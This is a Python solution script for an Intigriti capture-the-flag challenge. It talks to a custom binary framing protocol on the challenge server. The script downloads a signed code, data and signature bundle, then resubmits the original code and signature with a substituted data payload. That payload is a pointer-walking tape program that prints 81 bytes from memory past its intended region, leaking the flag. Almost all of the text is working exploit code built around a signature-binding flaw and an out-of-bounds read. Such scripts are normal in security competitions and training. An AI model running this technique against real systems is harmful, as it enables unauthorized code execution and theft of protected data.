import requests

URL = "https://challenge-1126.challenges.intigriti.io/custom_protocol"

SECRET = (
    b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_"
    b"1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"
)


def frame(command, payload=b""):
    return b"w" + len(payload).to_bytes(4, "little") + command + payload


def send(commands):
    body = SECRET + b"".join(commands)
    response = requests.post(URL, data=body, timeout=20)
    response.raise_for_status()
    return response.content


def parse_frames(response):
    frames = {}
    pos = 0

    while pos < len(response):
        pos = response.find(b"w", pos)
        if pos == -1 or pos + 9 > len(response):
            break

        length = int.from_bytes(response[pos + 1 : pos + 5], "little")
        end = pos + 5 + length

        if length < 4 or end > len(response):
            pos += 1
            continue

        command = response[pos + 5 : pos + 9]
        payload = response[pos + 9 : end]
        frames[command] = payload
        pos = end

    return frames


# Retrieve original signed components.
help_response = send([frame(b"HELP")])
print("HELP response:", repr(help_response))

components = parse_frames(help_response)

for name in (b"CODE", b"DATA", b"SIGN"):
    if name not in components:
        raise RuntimeError(f"Missing {name.decode()}: {help_response!r}")

code = components[b"CODE"]
open("/tmp/bf.bin", "wb").write(code)
data = components[b"DATA"]
print("Original DATA:", repr(data))
sign = components[b"SIGN"]

print(f"CODE: {len(code)} bytes")
print(f"DATA: {len(data)} bytes")
print(f"SIGN: {len(sign)} bytes")

# Read 81 consecutive bytes, starting at tape offset 256.
exploit = b">" * 256 + b".>" * 81
exploit = exploit.ljust(len(data), b"\x00")

response = send(
    [
        frame(b"CODE", code),
        frame(b"PING", data),
        frame(b"DATA", exploit),
        frame(b"SIGN", sign),
        frame(b"EXEC"),
    ]
)

marker = b"ACK\x00ACK\x00PONGACK\x00ACK\x00"
raw = response.split(marker, 1)[1]

print("FLAG:", repr(raw[:81]))
print("Decoded:", raw[:81].decode(errors="replace"))
